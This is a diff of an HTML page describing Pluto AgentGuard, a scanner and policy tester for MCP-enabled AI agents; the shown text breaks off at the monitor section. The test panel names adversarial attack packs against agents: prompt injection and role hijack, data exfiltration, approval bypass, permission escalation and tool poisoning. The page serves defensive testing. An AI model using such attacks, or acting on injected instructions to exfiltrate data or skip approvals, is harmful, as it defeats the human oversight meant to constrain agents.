@@ -3,629 +3,464 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pluto AgentGuard — How It Works</title>
+    <title>Pluto AgentGuard v0.9 — How It Works</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0e1a; color: #e2e8f0; overflow-x: hidden; }
-
-        /* Header */
-        .hero { text-align: center; padding: 3rem 2rem 2rem; background: linear-gradient(135deg, #1e1b4b 0%, #0f172a 50%, #1a0a2e 100%); }
-        .hero h1 { font-size: 2.5rem; margin-bottom: 0.5rem; }
-        .hero h1 span { color: #f87171; }
-        .hero .tagline { color: #94a3b8; font-size: 1.15rem; max-width: 700px; margin: 0 auto 1.5rem; line-height: 1.6; }
-        .hero code { background: #1e293b; padding: 0.5rem 1.2rem; border-radius: 8px; font-size: 1rem; display: inline-block; color: #86efac; border: 1px solid #334155; }
-
-        /* Nav tabs */
-        .tabs { display: flex; justify-content: center; gap: 0.5rem; padding: 1.5rem 1rem 0; flex-wrap: wrap; }
-        .tab { padding: 0.7rem 1.5rem; border-radius: 8px 8px 0 0; cursor: pointer; font-weight: 600; font-size: 0.95rem; border: 1px solid #334155; border-bottom: none; background: #1e293b; color: #94a3b8; transition: all 0.2s; }
-        .tab:hover { background: #293548; color: #e2e8f0; }
-        .tab.active { background: #0f172a; color: #f87171; border-color: #f87171; border-bottom: 2px solid #0f172a; position: relative; top: 1px; }
-
-        /* Panels */
-        .panel-container { max-width: 1100px; margin: 0 auto; padding: 0 1rem 3rem; }
-        .panel { display: none; background: #0f172a; border: 1px solid #334155; border-radius: 0 12px 12px 12px; padding: 2.5rem; animation: fadeIn 0.3s ease; }
-        .panel.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* Section headers */
-        .panel h2 { font-size: 1.5rem; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.6rem; }
-        .panel h3 { font-size: 1.1rem; color: #cbd5e1; margin: 1.5rem 0 0.8rem; }
-
-        /* Flow diagram */
-        .flow { display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin: 1.5rem 0; flex-wrap: wrap; }
-        .flow-box { background: #1e293b; border: 1px solid #475569; border-radius: 10px; padding: 1rem 1.2rem; text-align: center; min-width: 140px; }
-        .flow-box.input { border-color: #3b82f6; }
-        .flow-box.tool { border-color: #f87171; background: linear-gradient(135deg, #1e293b, #2d1520); }
-        .flow-box.output { border-color: #22c55e; }
-        .flow-arrow { font-size: 1.5rem; color: #475569; }
-        .flow-label { font-size: 0.75rem; color: #64748b; margin-top: 0.3rem; }
-
-        /* Terminal simulation */
-        .terminal { background: #0c0c0c; border: 1px solid #333; border-radius: 10px; padding: 0; margin: 1.5rem 0; overflow: hidden; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; font-size: 0.85rem; }
-        .terminal-header { background: #1a1a1a; padding: 0.5rem 1rem; display: flex; gap: 0.4rem; align-items: center; }
-        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
-        .terminal-dot.red { background: #ff5f56; }
-        .terminal-dot.yellow { background: #ffbd2e; }
-        .terminal-dot.green { background: #27c93f; }
-        .terminal-title { color: #666; font-size: 0.75rem; margin-left: 0.5rem; }
-        .terminal-body { padding: 1rem 1.2rem; line-height: 1.7; overflow-x: auto; }
-        .terminal-body .cmd { color: #86efac; }
-        .terminal-body .dim { color: #64748b; }
-        .terminal-body .critical { color: #f87171; }
-        .terminal-body .high { color: #fb923c; }
-        .terminal-body .medium { color: #facc15; }
-        .terminal-body .green { color: #4ade80; }
-        .terminal-body .blue { color: #60a5fa; }
-        .terminal-body .bold { font-weight: bold; color: #fff; }
-        .terminal-body .score-bar { letter-spacing: -1px; }
-
-        /* Tables */
-        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
-        th { background: #1e293b; padding: 0.7rem 1rem; text-align: left; font-size: 0.85rem; color: #94a3b8; border-bottom: 2px solid #334155; }
-        td { padding: 0.7rem 1rem; border-bottom: 1px solid #1e293b; font-size: 0.9rem; }
-        tr:hover td { background: #1e293b33; }
-
-        /* Cards grid */
-        .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem; margin: 1.5rem 0; }
-        .card { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 1.2rem; }
-        .card-icon { font-size: 1.8rem; margin-bottom: 0.5rem; }
-        .card h4 { margin-bottom: 0.4rem; }
-        .card p { color: #94a3b8; font-size: 0.85rem; line-height: 1.5; }
-
-        /* Status badges */
-        .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; }
-        .badge-red { background: #7f1d1d; color: #fca5a5; }
-        .badge-orange { background: #7c2d12; color: #fdba74; }
-        .badge-yellow { background: #713f12; color: #fde047; }
-        .badge-green { background: #14532d; color: #86efac; }
-        .badge-blue { background: #1e3a5f; color: #93c5fd; }
-
-        /* Comparison layer diagram */
-        .layer-stack { max-width: 600px; margin: 1.5rem auto; }
-        .layer { border-radius: 10px; padding: 1rem 1.5rem; margin-bottom: 0.5rem; text-align: center; }
-        .layer.user { background: #1e293b; border: 1px solid #475569; }
-        .layer.guardrails { background: #1e3a5f; border: 1px solid #3b82f6; }
-        .layer.agentguard { background: #3b1520; border: 2px solid #f87171; }
-        .layer-label { font-size: 0.75rem; color: #94a3b8; margin-bottom: 0.2rem; }
-        .layer-title { font-weight: 700; }
-        .layer-desc { font-size: 0.8rem; color: #94a3b8; margin-top: 0.2rem; }
-        .layer-arrow { text-align: center; color: #475569; font-size: 1.2rem; margin: 0.2rem 0; }
-
-        /* Checklist */
-        .checklist { list-style: none; margin: 1rem 0; }
-        .checklist li { padding: 0.5rem 0; display: flex; align-items: flex-start; gap: 0.6rem; font-size: 0.9rem; }
-        .checklist li .icon { flex-shrink: 0; margin-top: 2px; }
-
-        /* Interactive whatif */
-        .whatif-controls { background: #1e293b; border-radius: 10px; padding: 1.5rem; margin: 1.5rem 0; }
-        .whatif-row { display: flex; align-items: center; gap: 1rem; padding: 0.6rem 0; border-bottom: 1px solid #33415566; }
-        .whatif-row:last-child { border-bottom: none; }
-        .whatif-row label { flex: 1; font-size: 0.9rem; cursor: pointer; }
-        .whatif-row input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; accent-color: #f87171; }
-        .whatif-row .impact { font-size: 0.85rem; color: #4ade80; min-width: 50px; text-align: right; }
-        .score-display { display: flex; justify-content: center; gap: 3rem; margin: 1.5rem 0; text-align: center; }
-        .score-box { }
-        .score-box .number { font-size: 3rem; font-weight: 800; }
-        .score-box .label { font-size: 0.8rem; color: #94a3b8; }
-        .score-box .number.before { color: #f87171; }
-        .score-box .number.after { color: #4ade80; transition: all 0.3s; }
-        .score-arrow { font-size: 2rem; color: #475569; align-self: center; }
-        .score-delta { text-align: center; font-size: 1.1rem; color: #4ade80; font-weight: 600; margin-bottom: 1rem; transition: all 0.3s; }
-
-        /* Risk bar */
-        .risk-bar-container { margin: 1rem 0; }
-        .risk-bar { height: 12px; border-radius: 6px; background: #1e293b; overflow: hidden; position: relative; }
-        .risk-bar-fill { height: 100%; border-radius: 6px; transition: width 0.5s ease, background 0.5s ease; }
-        .risk-bar-label { display: flex; justify-content: space-between; font-size: 0.75rem; color: #64748b; margin-top: 0.3rem; }
-
-        /* Footer */
-        .footer { text-align: center; padding: 2rem; color: #475569; font-size: 0.8rem; border-top: 1px solid #1e293b; margin-top: 2rem; }
-        .footer a { color: #f87171; text-decoration: none; }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0e1a;color:#e2e8f0;overflow-x:hidden}
+        .hero{text-align:center;padding:2.5rem 2rem 1.5rem;background:linear-gradient(135deg,#1e1b4b 0%,#0f172a 50%,#1a0a2e 100%)}
+        .hero h1{font-size:2.3rem;margin-bottom:.4rem}.hero h1 span{color:#f87171}
+        .hero .tagline{color:#94a3b8;font-size:1.05rem;max-width:680px;margin:0 auto 1rem;line-height:1.6}
+        .hero code{background:#1e293b;padding:.4rem 1rem;border-radius:8px;font-size:.95rem;display:inline-block;color:#86efac;border:1px solid #334155}
+        .hero .version{color:#475569;font-size:.8rem;margin-top:.5rem}
+        .tabs{display:flex;justify-content:center;gap:.4rem;padding:1.2rem 1rem 0;flex-wrap:wrap}
+        .tab{padding:.6rem 1.1rem;border-radius:8px 8px 0 0;cursor:pointer;font-weight:600;font-size:.85rem;border:1px solid #334155;border-bottom:none;background:#1e293b;color:#94a3b8;transition:all .2s}
+        .tab:hover{background:#293548;color:#e2e8f0}
+        .tab.active{background:#0f172a;color:#f87171;border-color:#f87171;border-bottom:2px solid #0f172a;position:relative;top:1px}
+        .pc{max-width:1100px;margin:0 auto;padding:0 1rem 3rem}
+        .panel{display:none;background:#0f172a;border:1px solid #334155;border-radius:0 12px 12px 12px;padding:2rem;animation:fadeIn .3s ease}
+        .panel.active{display:block}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+        .panel h2{font-size:1.4rem;margin-bottom:.8rem;display:flex;align-items:center;gap:.5rem}
+        .panel h3{font-size:1.05rem;color:#cbd5e1;margin:1.3rem 0 .6rem}
+        table{width:100%;border-collapse:collapse;margin:.8rem 0}
+        th{background:#1e293b;padding:.6rem .8rem;text-align:left;font-size:.8rem;color:#94a3b8;border-bottom:2px solid #334155}
+        td{padding:.6rem .8rem;border-bottom:1px solid #1e293b;font-size:.85rem}
+        tr:hover td{background:#1e293b33}
+        .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:.8rem;margin:1rem 0}
+        .card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:1rem}
+        .card-icon{font-size:1.5rem;margin-bottom:.3rem}
+        .card h4{margin-bottom:.3rem;font-size:.9rem}
+        .card p{color:#94a3b8;font-size:.8rem;line-height:1.4}
+        .badge{display:inline-block;padding:2px 7px;border-radius:4px;font-size:.7rem;font-weight:600}
+        .badge-red{background:#7f1d1d;color:#fca5a5}.badge-orange{background:#7c2d12;color:#fdba74}
+        .badge-yellow{background:#713f12;color:#fde047}.badge-green{background:#14532d;color:#86efac}
+        .layer-stack{max-width:580px;margin:1.2rem auto}
+        .layer{border-radius:10px;padding:.8rem 1.2rem;margin-bottom:.4rem;text-align:center}
+        .layer.user{background:#1e293b;border:1px solid #475569}
+        .layer.guardrails{background:#1e3a5f;border:1px solid #3b82f6}
+        .layer.agentguard{background:#3b1520;border:2px solid #f87171}
+        .layer-label{font-size:.7rem;color:#94a3b8;margin-bottom:.1rem}
+        .layer-title{font-weight:700;font-size:.95rem}
+        .layer-desc{font-size:.75rem;color:#94a3b8;margin-top:.1rem}
+        .layer-arrow{text-align:center;color:#475569;font-size:1rem;margin:.1rem 0}
+        .term{background:#0c0c0c;border:1px solid #333;border-radius:10px;overflow:hidden;font-family:'Cascadia Code','Fira Code',Consolas,monospace;font-size:.8rem;margin:1rem 0}
+        .term-h{background:#1a1a1a;padding:.4rem .8rem;display:flex;gap:.3rem;align-items:center}
+        .term-d{width:9px;height:9px;border-radius:50%}.term-d.r{background:#ff5f56}.term-d.y{background:#ffbd2e}.term-d.g{background:#27c93f}
+        .term-t{color:#666;font-size:.7rem;margin-left:.4rem}
+        .term-b{padding:.8rem 1rem;line-height:1.7;overflow-x:auto}
+        .term-b .cmd{color:#86efac}.term-b .dim{color:#64748b}.term-b .crit{color:#f87171}.term-b .high{color:#fb923c}
+        .term-b .med{color:#facc15}.term-b .grn{color:#4ade80}.term-b .bold{font-weight:bold;color:#fff}
+        .flow{display:flex;align-items:center;justify-content:center;gap:.4rem;margin:1.2rem 0;flex-wrap:wrap}
+        .flow-box{background:#1e293b;border:1px solid #475569;border-radius:10px;padding:.8rem 1rem;text-align:center;min-width:120px;font-size:.85rem}
+        .flow-box.input{border-color:#3b82f6}.flow-box.tool{border-color:#f87171;background:linear-gradient(135deg,#1e293b,#2d1520)}
+        .flow-box.output{border-color:#22c55e}
+        .flow-arrow{font-size:1.3rem;color:#475569}
+        .flow-label{font-size:.7rem;color:#64748b;margin-top:.2rem}
+        .whatif-controls{background:#1e293b;border-radius:10px;padding:1.2rem;margin:1rem 0}
+        .whatif-row{display:flex;align-items:center;gap:.8rem;padding:.5rem 0;border-bottom:1px solid #33415566}
+        .whatif-row:last-child{border-bottom:none}
+        .whatif-row label{flex:1;font-size:.85rem;cursor:pointer}
+        .whatif-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer;accent-color:#f87171}
+        .whatif-row .impact{font-size:.8rem;color:#4ade80;min-width:45px;text-align:right}
+        .score-display{display:flex;justify-content:center;gap:2.5rem;margin:1.2rem 0;text-align:center}
+        .score-box .number{font-size:2.5rem;font-weight:800}
+        .score-box .label{font-size:.75rem;color:#94a3b8}
+        .score-box .number.before{color:#f87171}
+        .score-box .number.after{color:#4ade80;transition:all .3s}
+        .score-arrow{font-size:1.8rem;color:#475569;align-self:center}
+        .score-delta{text-align:center;font-size:1rem;color:#4ade80;font-weight:600;margin-bottom:.8rem;transition:all .3s}
+        .risk-bar{height:10px;border-radius:5px;background:#1e293b;overflow:hidden;margin:.8rem 0}
+        .risk-bar-fill{height:100%;border-radius:5px;transition:width .5s ease,background .5s ease}
+        .risk-bar-label{display:flex;justify-content:space-between;font-size:.7rem;color:#64748b}
+        .owasp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:.6rem;margin:1rem 0}
+        .owasp-item{background:#1e293b;border-radius:8px;padding:.8rem 1rem;border-left:3px solid #475569}
+        .owasp-item.pass{border-left-color:#22c55e}.owasp-item.fail{border-left-color:#ef4444}.owasp-item.partial{border-left-color:#f59e0b}.owasp-item.planned{border-left-color:#475569}
+        .owasp-item .oi-title{font-weight:600;font-size:.85rem;margin-bottom:.3rem}
+        .owasp-item .oi-status{font-size:.75rem}
+        .owasp-item .oi-controls{font-size:.75rem;color:#94a3b8;margin-top:.2rem}
+        .footer{text-align:center;padding:1.5rem;color:#475569;font-size:.75rem;border-top:1px solid #1e293b;margin-top:2rem}
+        .footer a{color:#f87171;text-decoration:none}
     </style>
 </head>
 <body>
 
 <div class="hero">
     <h1>🛡️ Pluto <span>AgentGuard</span></h1>
-    <p class="tagline">
-        Guardrails protect what LLMs <strong>say</strong>.
-        AgentGuard watches what agents actually <strong>do</strong>.
-    </p>
+    <p class="tagline">OWASP-aligned launch gate for MCP-enabled AI agents.<br>Scan · Test · Monitor · Simulate · Evidence · Drift · OWASP Coverage</p>
     <code>pip install pluto-aguard</code>
+    <div class="version">v0.9.0 · 7 commands · 20 OWASP controls · 84 tests</div>
 </div>
 
 <div class="tabs">
     <div class="tab active" onclick="showPanel('overview')">🏠 Overview</div>
     <div class="tab" onclick="showPanel('scan')">🔍 Scan</div>
+    <div class="tab" onclick="showPanel('test')">🎯 Test</div>
     <div class="tab" onclick="showPanel('monitor')">📡 Monitor</div>
     <div class="tab" onclick="showPanel('whatif')">🔮 What-If</div>
-    <div class="tab" onclick="showPanel('integrate')">🔌 Integration</div>
-    <div class="tab" onclick="showPanel('test')">🧪 Testing</div>
+    <div class="tab" onclick="showPanel('owasp')">🛡️ OWASP</div>
+    <div class="tab" onclick="showPanel('evidence')">📋 Evidence</div>
+    <div class="tab" onclick="showPanel('integrate')">🔌 Integrate</div>
 </div>
 
-<div class="panel-container">
+<div class="pc">
 
-    <!-- OVERVIEW -->
-    <div class="panel active" id="panel-overview">
-        <h2>📐 Where AgentGuard Fits</h2>
-
-        <div class="layer-stack">
-            <div class="layer user">
-                <div class="layer-label">YOUR APPLICATION</div>
-                <div class="layer-title">AI Agent</div>
-                <div class="layer-desc">Calls tools, accesses data, chains actions via MCP</div>
-            </div>
-            <div class="layer-arrow">⬇️ prompts & responses</div>
-            <div class="layer guardrails">
-                <div class="layer-label">LAYER 1 — ALREADY SOLVED</div>
-                <div class="layer-title">Content Guardrails</div>
-                <div class="layer-desc">Azure Content Safety · NeMo · Guardrails AI — filters toxic/unsafe text</div>
-            </div>
-            <div class="layer-arrow">⬇️ tool calls & actions</div>
-            <div class="layer agentguard">
-                <div class="layer-label">LAYER 2 — THE GAP AGENTGUARD FILLS</div>
-                <div class="layer-title">🛡️ Pluto AgentGuard</div>
-                <div class="layer-desc">Scans configs · Monitors behavior · Detects permission drift · Simulates policy impact</div>
-            </div>
+<!-- OVERVIEW -->
+<div class="panel active" id="panel-overview">
+    <h2>📐 Where AgentGuard Fits</h2>
+    <div class="layer-stack">
+        <div class="layer user">
+            <div class="layer-label">YOUR APPLICATION</div>
+            <div class="layer-title">AI Agent</div>
+            <div class="layer-desc">Calls tools, accesses data, chains actions via MCP</div>
         </div>
-
-        <h3>Three Commands, Three Capabilities</h3>
-        <div class="cards">
-            <div class="card" style="border-top: 3px solid #3b82f6;">
-                <div class="card-icon">🔍</div>
-                <h4>aguard scan</h4>
-                <p>"Look at my config files and tell me what's wrong."<br><br>
-                Scans MCP configs, agent permissions, env files for secrets. Maps to OWASP MCP Top 10.</p>
-            </div>
-            <div class="card" style="border-top: 3px solid #f59e0b;">
-                <div class="card-icon">📡</div>
-                <h4>aguard monitor</h4>
-                <p>"Here's what my agent did — did it break any rules?"<br><br>
-                Replays agent traces against a policy. Flags unauthorized tools, permission drift, data violations.</p>
-            </div>
-            <div class="card" style="border-top: 3px solid #f87171;">
-                <div class="card-icon">🔮</div>
-                <h4>aguard whatif</h4>
-                <p>"If I restrict this tool, how much does risk drop?"<br><br>
-                Simulates policy changes before applying them. No other tool does this.</p>
-            </div>
+        <div class="layer-arrow">⬇️ prompts & responses</div>
+        <div class="layer guardrails">
+            <div class="layer-label">LAYER 1 — ALREADY SOLVED</div>
+            <div class="layer-title">Content Guardrails</div>
+            <div class="layer-desc">Azure Content Safety · NeMo · Guardrails AI — filters toxic/unsafe text</div>
         </div>
-
-        <h3>Prerequisites</h3>
-        <table>
-            <tr><th>Requirement</th><th>Details</th><th>Check</th></tr>
-            <tr><td>Python</td><td>3.10 or higher</td><td><code>python --version</code></td></tr>
-            <tr><td>pip</td><td>Any recent version</td><td><code>pip --version</code></td></tr>
-            <tr><td>Cloud accounts</td><td colspan="2">❌ <strong>Not needed.</strong> Runs 100% locally.</td></tr>
-            <tr><td>API keys</td><td colspan="2">❌ <strong>Not needed.</strong> No external calls.</td></tr>
-        </table>
+        <div class="layer-arrow">⬇️ tool calls & actions</div>
+        <div class="layer agentguard">
+            <div class="layer-label">LAYER 2 — THE GAP AGENTGUARD FILLS</div>
+            <div class="layer-title">🛡️ Pluto AgentGuard</div>
+            <div class="layer-desc">Scans · Tests · Monitors · Simulates · Generates Evidence · Detects Drift · Reports OWASP Coverage</div>
+        </div>
     </div>
 
-    <!-- SCAN -->
-    <div class="panel" id="panel-scan">
-        <h2>🔍 aguard scan — Static Security Analysis</h2>
-        <p style="color:#94a3b8; margin-bottom:1rem;">Point it at a folder. It reads your files and reports security issues.</p>
+    <h3>Seven Commands</h3>
+    <div class="cards">
+        <div class="card" style="border-top:3px solid #3b82f6"><div class="card-icon">🔍</div><h4>aguard scan</h4><p>Find secrets, misconfigs, unsafe code in any AI project</p></div>
+        <div class="card" style="border-top:3px solid #ef4444"><div class="card-icon">🎯</div><h4>aguard test</h4><p>17 adversarial attacks against your policy — what gets through?</p></div>
+        <div class="card" style="border-top:3px solid #f59e0b"><div class="card-icon">📡</div><h4>aguard monitor</h4><p>Replay traces, detect unauthorized actions + drift</p></div>
+        <div class="card" style="border-top:3px solid #8b5cf6"><div class="card-icon">🔮</div><h4>aguard whatif</h4><p>Simulate policy changes, see risk drop before applying</p></div>
+        <div class="card" style="border-top:3px solid #22c55e"><div class="card-icon">🛡️</div><h4>aguard owasp</h4><p>20-control OWASP MCP/LLM coverage report</p></div>
+        <div class="card" style="border-top:3px solid #06b6d4"><div class="card-icon">📋</div><h4>aguard evidence</h4><p>Launch readiness packet with approval checklist</p></div>
+        <div class="card" style="border-top:3px solid #64748b"><div class="card-icon">📏</div><h4>aguard baseline</h4><p>Snapshot + drift detection over time</p></div>
+    </div>
 
-        <h3>How it works</h3>
-        <div class="flow">
-            <div class="flow-box input">
-                <strong>Your Project</strong>
-                <div class="flow-label">mcp.json, .env,<br>agent-config.yaml</div>
-            </div>
-            <div class="flow-arrow">→</div>
-            <div class="flow-box tool">
-                <strong>🛡️ aguard scan</strong>
-                <div class="flow-label">reads files locally<br>no network calls</div>
-            </div>
-            <div class="flow-arrow">→</div>
-            <div class="flow-box output">
-                <strong>Security Report</strong>
-                <div class="flow-label">findings + risk score<br>terminal / JSON / HTML</div>
-            </div>
-        </div>
+    <h3>Prerequisites</h3>
+    <table>
+        <tr><th>Requirement</th><th>Details</th><th>Check</th></tr>
+        <tr><td>Python</td><td>3.10 or higher</td><td><code>python --version</code></td></tr>
+        <tr><td>pip</td><td>Any recent version</td><td><code>pip --version</code></td></tr>
+        <tr><td>Cloud accounts</td><td colspan="2">❌ <strong>Not needed.</strong> Runs 100% locally.</td></tr>
+    </table>
+</div>
 
-        <h3>What files does it look for?</h3>
-        <table>
-            <tr><th>File Pattern</th><th>What It Checks</th></tr>
-            <tr><td><code>mcp.json</code>, <code>mcp.yaml</code>, <code>.mcp.json</code></td><td>MCP server permissions, auth, transport security, tool poisoning</td></tr>
-            <tr><td><code>agent-config.yaml</code>, <code>agent.yaml</code></td><td>Agent permissions, human-in-the-loop gates, rate limits</td></tr>
-            <tr><td><code>*.env</code>, <code>*.py</code>, <code>*.js</code>, <code>*.ts</code>, <code>*.yaml</code></td><td>Hardcoded secrets (AWS, OpenAI, GitHub, Slack, Azure, etc.)</td></tr>
-        </table>
+<!-- SCAN -->
+<div class="panel" id="panel-scan">
+    <h2>🔍 aguard scan — Static Security Analysis</h2>
+    <p style="color:#94a3b8;margin-bottom:.8rem">Point it at any AI project folder. Finds real issues — no MCP configs required.</p>
 
-        <h3>What vulnerabilities does it find?</h3>
-        <table>
-            <tr><th>Finding</th><th>Severity</th><th>OWASP ID</th></tr>
-            <tr><td>Wildcard (*) permissions on MCP server</td><td><span class="badge badge-red">CRITICAL</span></td><td>OWASP-MCP-03</td></tr>
-            <tr><td>No auth on remote MCP server</td><td><span class="badge badge-red">CRITICAL</span></td><td>OWASP-MCP-01</td></tr>
-            <tr><td>Tool poisoning in descriptions</td><td><span class="badge badge-red">CRITICAL</span></td><td>OWASP-MCP-02</td></tr>
-            <tr><td>HTTP transport (no TLS)</td><td><span class="badge badge-orange">HIGH</span></td><td>OWASP-MCP-06</td></tr>
-            <tr><td>Dangerous tools without human approval</td><td><span class="badge badge-orange">HIGH</span></td><td>OWASP-MCP-04</td></tr>
-            <tr><td>Hardcoded API keys / tokens</td><td><span class="badge badge-orange">HIGH</span></td><td>OWASP-MCP-07</td></tr>
-            <tr><td>Static long-lived tokens</td><td><span class="badge badge-yellow">MEDIUM</span></td><td>OWASP-MCP-05</td></tr>
-            <tr><td>No timeout or rate limits</td><td><span class="badge badge-yellow">MEDIUM</span></td><td>OWASP-MCP-09</td></tr>
-        </table>
+    <div class="flow">
+        <div class="flow-box input"><strong>Your Project</strong><div class="flow-label">*.py, .env, Dockerfile,<br>mcp.json, requirements.txt</div></div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box tool"><strong>🛡️ aguard scan</strong><div class="flow-label">18+ secret patterns<br>AI code analysis<br>MCP config checks</div></div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box output"><strong>Report</strong><div class="flow-label">terminal / JSON /<br>HTML / SARIF</div></div>
+    </div>
 
-        <h3>Example output</h3>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <span class="terminal-title">Terminal — aguard scan</span>
-            </div>
-            <div class="terminal-body">
+    <h3>What it finds</h3>
+    <table>
+        <tr><th>Finding</th><th>Severity</th><th>OWASP</th></tr>
+        <tr><td>eval()/exec() on LLM output</td><td><span class="badge badge-red">CRITICAL</span></td><td>MCP05</td></tr>
+        <tr><td>Wildcard (*) permissions on MCP server</td><td><span class="badge badge-red">CRITICAL</span></td><td>MCP02</td></tr>
+        <tr><td>No auth on remote MCP server</td><td><span class="badge badge-red">CRITICAL</span></td><td>MCP07</td></tr>
+        <tr><td>Tool poisoning in descriptions</td><td><span class="badge badge-red">CRITICAL</span></td><td>MCP03</td></tr>
+        <tr><td>Hardcoded secrets (18+ patterns)</td><td><span class="badge badge-orange">HIGH</span></td><td>MCP01</td></tr>
+        <tr><td>.env not in .gitignore</td><td><span class="badge badge-orange">HIGH</span></td><td>MCP01</td></tr>
+        <tr><td>Secrets in Dockerfile ENV</td><td><span class="badge badge-orange">HIGH</span></td><td>MCP01</td></tr>
+        <tr><td>LangChain allow_dangerous_requests=True</td><td><span class="badge badge-orange">HIGH</span></td><td>MCP05</td></tr>
+        <tr><td>Sensitive info in system prompts</td><td><span class="badge badge-orange">HIGH</span></td><td>MCP10</td></tr>
+        <tr><td>LangChain verbose=True in production</td><td><span class="badge badge-yellow">MEDIUM</span></td><td>—</td></tr>
+        <tr><td>Container running as root</td><td><span class="badge badge-yellow">MEDIUM</span></td><td>—</td></tr>
+        <tr><td>Unpinned AI dependencies</td><td><span class="badge badge-yellow">MEDIUM</span></td><td>MCP04</td></tr>
+        <tr><td>No timeout or rate limits</td><td><span class="badge badge-yellow">MEDIUM</span></td><td>LLM10</td></tr>
+    </table>
+
+    <h3>Example output</h3>
+    <div class="term"><div class="term-h"><div class="term-d r"></div><div class="term-d y"></div><div class="term-d g"></div><span class="term-t">Terminal</span></div><div class="term-b">
 <span class="cmd">$ aguard scan ./my-agent-project/</span>
 
-<span class="bold">🔍 Scanning</span> /home/user/my-agent-project...
+<span class="bold">🔍 Scanning</span> ./my-agent-project...
 
-  <span class="dim">Scanning MCP configurations and secrets...</span>
-  <span class="dim">Scanning agent permission configurations...</span>
-  <span class="critical">🔴 CRITICAL: Wildcard permissions on MCP server 'postgres-server' (OWASP-MCP-03)</span>
-     <span class="dim">📄 mcp.json:5</span>
-  <span class="critical">🔴 CRITICAL: No authentication on remote MCP server 'api-gateway' (OWASP-MCP-01)</span>
-     <span class="dim">📄 mcp.json:12</span>
-  <span class="high">🟠 HIGH: Hardcoded OpenAI Key detected (OWASP-MCP-07)</span>
-     <span class="dim">📄 .env:3</span>
-     <span class="dim">Evidence: sk-p****XYZ1</span>
-  <span class="high">🟠 HIGH: Dangerous tools without human approval (OWASP-MCP-04)</span>
-     <span class="dim">📄 agent-config.yaml</span>
-  <span class="medium">🟡 MEDIUM: No timeout or rate limits on agent 'data-agent'</span>
-     <span class="dim">📄 agent-config.yaml</span>
+  <span class="crit">🔴 CRITICAL: Unsafe execution of LLM output: eval() (MCP05:2025)</span>
+     <span class="dim">📄 agent.py:24</span>
+  <span class="high">🟠 HIGH: Hardcoded OpenAI Key detected (MCP01:2025)</span>
+     <span class="dim">📄 .env:1 · Evidence: sk-p****cdef</span>
+  <span class="high">🟠 HIGH: .env file not in .gitignore (MCP01:2025)</span>
+  <span class="high">🟠 HIGH: Secret in Dockerfile ENV (MCP01:2025)</span>
+  <span class="high">🟠 HIGH: LangChain dangerous requests allowed (MCP05:2025)</span>
+  <span class="med">🟡 MEDIUM: Unpinned AI dependencies (MCP04:2025)</span>
+  <span class="med">🟡 MEDIUM: Container runs as root</span>
 
-  📊 Risk Score: <span class="critical">72/100</span> <span class="critical score-bar">████████████████████████████████████</span><span class="dim score-bar">░░░░░░░░░░░░░░░</span>
-  📋 Findings: <span class="critical">2 critical</span> · <span class="high">2 high</span> · <span class="medium">1 medium</span>
-  📂 Scanned 47 files in 38ms
-            </div>
-        </div>
+  📊 Risk Score: <span class="crit">100/100</span> <span class="crit">██████████████████████████████████████████████████</span>
+  📋 Findings: <span class="crit">1 critical</span> · <span class="high">14 high</span> · <span class="med">3 medium</span>
+  📂 Scanned 5 files in 155ms
+    </div></div>
+
+    <h3>CI gate flags</h3>
+    <div class="term"><div class="term-h"><div class="term-d r"></div><div class="term-d y"></div><div class="term-d g"></div><span class="term-t">CI Pipeline</span></div><div class="term-b">
+<span class="cmd">$ aguard scan . --max-risk 50 --fail-on high --format sarif -o results.sarif</span>
+<span class="dim"># Exits code 1 if risk > 50 or any HIGH+ findings</span>
+<span class="dim"># SARIF output integrates with GitHub Advanced Security</span>
+    </div></div>
+</div>
+
+<!-- TEST -->
+<div class="panel" id="panel-test">
+    <h2>🎯 aguard test — Adversarial Policy Simulation</h2>
+    <p style="color:#94a3b8;margin-bottom:.8rem">Simulates 17 attack scenarios against your policy. Reports what gets caught vs. what gets through. No LLM needed.</p>
+
+    <h3>5 Attack Packs</h3>
+    <div class="cards">
+        <div class="card"><div class="card-icon">💉</div><h4>prompt-injection</h4><p>Instruction override, role hijack, indirect injection, encoded payloads</p></div>
+        <div class="card"><div class="card-icon">📤</div><h4>data-exfiltration</h4><p>File export, network exfil, email exfil, SQL dump</p></div>
+        <div class="card"><div class="card-icon">⬆️</div><h4>permission-escalation</h4><p>Write on read-only, approval bypass, sudo, file delete</p></div>
+        <div class="card"><div class="card-icon">🔓</div><h4>approval-bypass</h4><p>Urgency bypass, claimed pre-auth, batch bypass</p></div>
+        <div class="card"><div class="card-icon">☠️</div><h4>tool-poisoning</h4><p>Hidden instructions, rug-pull updates</p></div>
     </div>
 
-    <!-- MONITOR -->
-    <div class="panel" id="panel-monitor">
-        <h2>📡 aguard monitor — Behavioral Audit</h2>
